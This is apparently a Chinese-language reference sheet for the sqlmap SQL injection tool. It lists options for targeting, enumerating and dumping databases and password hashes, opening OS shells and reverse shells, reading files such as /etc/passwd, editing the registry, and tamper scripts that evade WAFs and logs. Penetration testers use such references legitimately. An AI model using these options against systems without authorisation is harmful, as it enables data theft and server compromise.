#### sqlmap使用

##### 安装&更新


```
SQLMap安装
安装 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
更新
sqlmap --update
或者进入sqlmap目录
git pull

--version       #sqlmap版本号
-hh             #查看功能参数帮助信息
```

##### 使用

```
-u --url        #指定目标url
-r              #从文件中加载HTTP请求
-m              #从文本中获取多个目标扫描
-l              #指定logfile文件进行扫描,sqlmap可以直接加载burp保存到log文件进行扫描
-s              #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” --resume)
-g              #sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。
                 例：python sqlmap.py -g "inurl:\".php?id=1\""
                 此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。
-c　　　　　　　  #加载配置文件,配置文件可以指定扫描目标,方式,内容等，加载了配置文件sqlmap就会根据文件内容进行特定的扫描
-d              #连接数据库语句：sqlmap -d "mysql://账号：密码@192.168.1.1:3306/dvwa" -f --users
*               #指定参数后加*号 即表示此数据为我们要注入扫描的参数
-a
-v              #显示详细的等级(0-6)，如果你想看到sqlmap发送的测试payload最好的等级就是3。
        0：只显示Python的回溯，错误和关键消息。
        1：显示信息和警告消息。(默认)
        2：显示调试消息。
        3：有效载荷注入。
        4：显示HTTP请求。
        5：显示HTTP响应头。
        6：显示HTTP响应页面的内容
--level=        #指定探测等级1-5级 默认1级
--risk=         #指定风险1-3级,默认是1,2可以进行扫描cookie,3尝试对User-Angent,Referer进行注入,会增加OR语句的SQL注入测试
--batch         #一切的选项都可以用默认选，不需要每次回车选择


-p              #设置想要测试的参数。例如： -p "id,user-anget"
--skip=         #--level的值很大但是有个别参数不想测试的时候可以使用--skip参数--skip="user-angent.referer"
--method        #指定使用GET或者POST请求方法，POST方式提交数据(--method “POST” --data “page=1&id=2″)
--data=         #以POST方式提交数据:--data="id=1" 
--param-del=    #变量分隔符,默认为&，如改成';' --param-del=";"
--cookie=       #指定cookie
--random-agent  #随机调用user-agent：sqlmap/txt/user-agents.txt
--user-agent=   #指定user-agent注入
--headers=      #添加head头,例:--headers="X-Forwarded-For: 127.0.0.1"
--user-agent "Mozilla/5.0 (compatible; baiduspider/2.0; +http://www.baidu.com/search/spider.html)"#随机调用网络上的user-agent
--host=         #指定host
--charset=      #不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如:--charset=GBK
--referer=      #使用referer欺骗(--referer “http://www.baidu.com”)
--dbms=         #指定db，sqlmap支持的db有MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,IBM DB2,SQLite,Firebird,Sybase,SAP MaxDB
--technique=    #指定注入类型
            B布尔型
            E错误型
            U联合查询
            S堆栈查询
            T时间盲注

--dns-domain    #dns快速注入--dns-domain=dnslog.cn 
--tamper        #脚本,用于绕过应用层过滤,IPS,WAF






--mobile        #有时服务端只接收移动端的访问，此时可以设定此参数，系统会让你选一个移动端
--hpp           #HTTP参数污染可能会绕过WAF/IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效
--force-ssl     #HTTPS的扫描，或者在抓包文件里在Host头后面加上443端口号
--chunked       #使用HTTP分块传输编码(POST)请求 
--list-tampers  #显示可用脚本
--prefix        #在注入的payload的前面加一些字符，来保证payload的正常执行。
--suffix        #在注入的payload的后面加一些字符，来保证payload的正常执行:--prefix "’)" --suffix "AND (’a’=’a"

--proxy         #使用代理  --proxy “http://127.0.0.1:1080″ 
--proxy-cred    #当HTTP(S)代理需要认证时可以使用参数 --proxy-cred username:password
--ignore-proxy  #拒绝使用本地局域网的HTTP(S)代理，忽略系统代理设置，通常用于扫描本地网络目标

-o                #会开启默认的优化策略
--threads         #设置最大线程数 默认为1，不要超过10
--os              #指定系统Linux,Windows
--alert=          #成功SQL注入时警告
--beep            #发现SQL注入时发出蜂鸣声
--hex             #在数据检索期间使用十六进制转换
--no-cast         #提取数据时会将所有结果转换为字符串,默认用空格替换null, 老版本可能不支持空格替换使用--no-cast关闭替换
--no-escape       #sqlmap使用char()编码逃逸的方法替换字符串
--tor             #匿名网络注入
--identify-waf    #尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式
--skip-waf        #跳过WAF/IPS保护的启发式检测
--time-sec=       #盲注时延迟设置，默认--time-sec=5 为5秒
--null-connection #只获取页面的大小值，不是页面的内容。这样可以用于盲注判断真假
--delay=          #设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的
--timeout=        #设置请求超时时间，默认30秒
--retries         #如果上一条没有收到回应，会进行默认3次重试连接
--randomize       #每次随机给参数赋随机值，随机值与原始数据长度一致 (?id=59 --randomize="id")url请求会每次给id赋值10-99的随机值，长度会控制在两位数
--eval=           #每次执行请求前可以执行指定的python代码  
--second-order    #二阶SQL注入，有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址。
--safe-url        #提供一个安全不错误的连接，每隔一段时间都会去访问一下。
--safe-freq       #提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
--skip-urlencode  #默认Get方法会对传输内容进行编码，skip-urlencode会对传输的数据进行源数据传输，不会进行GET方式编码
--union-check     #是否支持union 注入
--union-cols      #联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。
--union-char      #指定UNION查询的字符
--invalid-bignum  #默认使用负值使参数失效，使用最大参数值使参数失效
--invalid-logical #默认使用负值使参数失效，使用布尔判断值使取值失效
--invalid-string  #使用随机字符串使使参数失效
--crawl           #爬行网站URL,sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。--crawl=3
--smart           #启发式判断注入,有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入
```
##### 枚举数据
```
-f                #指纹判别数据库类型
-b --banner       #获取数据库版本信息
--dbs             #列出所有数据库 
--is-dba          #查询是否数据库管理员权限
--privileges      #查看所有用户权限,-U查询指定用户权限，-CU查询当前用户权限
--roles           #枚举用户角色
--users           #枚举所有用户
--passwords       #当前用户有权限读取包含用户密码的彪的权限时，会现列举出用户，然后列出hash，并尝试破解，加-U 指定爆破用户
--current-user    #获取当前用户名称
--current-db      #获取当前数据库名称
--schema          #查源数据库
--hostname        #机器主机名
-a                #检索所有
-U                #指定数据库用户
-CU               #指定当前用户
-D                #指定数据库名
-T                #指定表名
-C                #指定字段
--tables          #枚举指定数据库中的表,在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称
--columns         #枚举数据库表中的列
--columns -T “user” -D “mysql”        #列出mysql数据库中的user表的所有字段
--exclude-sysdbs                      #只列出用户自己新建的数据库和表, 排除系统数据库
--dump -T "" -D "" -C ""              #列出指定数据库的表的字段的数据
--dump -T "" -D "" --start 2 --top 4  #列出指定数据库的表的2-4字段的数据
--dump-all                            #列出所有数据库所有表
--where                               #指定条件列数据
--start --stop                        #防止查询数量过多，可以先查询100条 --start 1 --stop 100
--count                               #数据计数
--search                              #搜索搜索列、表和/或数据库名称

--output-dir="/tmp"                   #指定输出目录
--purge-output                        #清除output文件夹
--flush-session                       #清空之前的session，重新测试该目标
--fresh-queries                       #忽略session文件保存的查询，重新查询
--cleanup                             #清除sqlmap注入时产生的udf与表。
```
##### 高级操作
```
--sql-shell
--sql-query=
--sql-file=     #执行指定文件中的SQL语句
--sql-shell     #交互式执行指定sql命令
--sql-query     #执行指定的sql语句 --sql-query "SELECT user()"


--os-cmd=       #执行系统命令
--os-shell      #系统交互shell
--os-pwn        #反弹shell    --os-pwn --msf-path=/opt/framework/msf5/
--msf-path=     #matesploit绝对路径  --msf-path=/opt/framework/msf5/
--os-smbrelay   #反弹msf下的shell或者vnc
--os-bof        #存储过程缓冲区溢出利用
--tmp-path=     #临时文件目录的远程绝对路径
--priv-esc      #数据库进程用户权限升级

--udf-inject    #导入用户自定义函数（获取系统权限）
--shared-lib=   #库的本地路径

--file-read     #读取指定文件：--file-read = "/etc/passwd"
--file-write    #写入本地文件
--file-dest     #要写入的绝对路径：--file-write /tmp/a.txt --file-dest /tmp/b.txt;将本地的a.txt文件写入到目标的b.txt

注册表操作
--reg-read      #读取win系统注册表，前提是有权对注册表进行操作
--reg-add       #增加win系统注册表
--reg-del       #删除win系统注册表

--reg-key       #键
--reg-value     #值
--reg-data      #数据
 
--string 
--not string
--regexp
--code
#默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200

--text-only
--titles
#有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。
```

##### tamper 脚本

```
apostrophemask.py                用UTF-8全角字符替换'（例如'->％EF％BC％87）
apostrophenullencode.py          用双unicode替换'（例如'->％00％27）
appendnullbyte.py                在payload的末尾附加NULL字节字符（％00）
base64encode.py                  对payload中的所有字符进行base64编码
between.py                       用运算符（'>'）替换'NOT BETWEEN 0 AND＃'，用运算符（'='）替换'BETWEEN＃AND＃'
bluecoat.py                      用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符'='
chardoubleencode.py              对payload中的所有字符进行双重URL编码（例如SELECT->％2553％2545％254C％2545％2543％2554）
charencode.py                    对payload中所有字符进行URL编码（例如SELECT->％53％45％4C％45％43％54）
charunicodeencode.py             对payload中的所有字符进行unicode编码（例如SELECT->％u0053％u0045％u004C％u0045％u0043％u0054）
charunicodeescape.py             使用Unicode转义payload中的未编码字符（例如SELECT->\u0053\u0045\u004C\u0045\u0043\u0054）
commalesslimit.py                用'LIMIT N OFFSET M'替换（MySQL）实例，例如'LIMIT M，N'
commalessmid.py                  用'MID（A FROM B FOR C）'替换（MySQL）实例，例如'MID（A，B，C）'
commentbeforeparentheses.py      在括号前加（内联）注释（例如（（->/**/（）
concat2concatws.py               用'CONCAT_WS（MID（CHAR（0），0，0），A，B）'替换（MySQL）实例，例如'CONCAT（A，B）' 。
equaltolike.py                   将（'='）运算符替换为'LIKE'
escapequotes.py                  斜杠转义单引号和双引号（例如'-> \'）
great.py                         替换运算符（'>' ）和'GREATEST'对应
Halfversionedmorekeywords.py     在每个关键字前添加mysql注释
hex2char.py                      替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串
htmlencode.py                    用HTML编码（使用代码点）所有非字母数字字符（例如'->'）
ifnull2casewhenisnull.py         绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’
ifnull2ifisnull.py               用'IF（ISNULL（A），B）替换'IFNULL（A，B）'之类的实例，A）'对应
informationschemacomment.py      在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /）
least.py                         用'LEAST'对应替换运算符（'>'）
lowercase.py                     用小写替换每个关键字字符（例如SELECT->select）
luanginx.py                      LUA-NginxWAF绕过（例如Cloudflare）
modsecurityversioned.py          包含带有（MySQL）版本注释的完整查询
modsecurityzeroversioned.py      包含带有（MySQL）零版本注释的完整查询
multiplespaces.py                在SQL关键字周围添加多个空格（''）
overlongutf8.py                  将payload中的所有（非字母数字）字符转换为超长UTF8（例如'->％C0％A7）
overlongutf8more.py              将payload中所有字符转换为超长UTF8（例如SELECT->％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94）
percent.py                       在每个字符前面添加一个百分号（'％'） （例如SELECT->％S％E％L％E％C％T）
plus2concat.py                   替换运算符（'+'）与（MsSQL）函数CONCAT（）对应
plus2fnconcat.py                 用（MsSQL）ODBC函数{fn CONCAT（）}替换为（'+'）
randomcase.py                    用随机大小写值替换每个关键字字符（例如SELECT-> SEleCt）
randomcomments.py                在SQL关键字内添加随机内联注释（例如SELECT-> S/**/E/**/LECT）
sp_password.py                   将（MsSQL）函数'sp_password'附加到payload的末尾，以便从DBMS日志中自动进行混淆
space2comment.py                 空格替换为/**_**/
space2dash.py                    空格替换为-加随机字符
space2hash.py                    空格替换为#加随机字符
space2morecomment.py             空格替换为/**_**/
space2morehash.py                空格替换为#加随机字符及换行符
space2mssqlblank.py              空格替换为其他空符号（MsSQL）
space2mssqlhash.py               空格替换为%23%0A(MsSQL)
space2mysqlblank.py              空格替换为其它空符号（Mysql）
space2mysqldash.py               替换空格字符（''）（’–‘）后跟一个破折号注释一个换行（’n’）
space2plus.py                    用加号（'+'）替换空格字符（''）
space2randomblank.py             用空格中的随机空白字符替换空格字符（''）有效的替代字符集
substring2leftright.py           用LEFT和RIGHT替换PostgreSQL SUBSTRING
symbolicologic.py                用符号（&&和||）替换AND和OR逻辑运算符
unionalltounion.py               用UNION SELECT替换UNION ALL SELECT
unmagicquotes.py                 用多字节组合％BF％27替换引号字符（'），并在末尾添加通用注释
uppercase.py-                    用大写值替换每个关键字字符（例如select -> SELECT）
varnish.py                       添加HTTP标头'X-originating-IP'以绕过Varnish防火墙
versionedkeywords.py             用注释封装每个非函数的关键字
versionedmorekeywords.py         将每个关键字包含（MySQL）版本注释
xforwardedfor.py                 添加伪造的HTTP标头'X-Forwarded-For
```

